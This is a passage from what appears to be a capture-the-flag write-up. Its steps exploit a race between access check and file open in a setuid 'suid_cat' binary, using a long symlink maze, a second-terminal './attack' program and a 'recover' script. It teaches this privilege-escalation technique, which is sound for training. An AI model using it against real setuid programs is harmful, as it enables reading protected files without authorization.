d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/lnk" > recover;
    chmod u+x recover;
    ```

## ATTACK

1. Open a second terminal and connect to your challenge instance
1. (**Terminal 1**) Run suid_cat with the link from your maze:

    ```bash
    ./maze/suid_cat entry/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk/lnk
    ```

1. (**Terminal 2**) Run your **attack** as soon as *"[-] access granted"* will be printed in **Terminal 1**:

    ```bash
    # You must run your attack before "[-] file opened" is printed (you will only have few seconds)
    ./attack
    ```

1. If your attack failed, run **recover** and do these steps again:

    ```bash
    ./recover
    ```
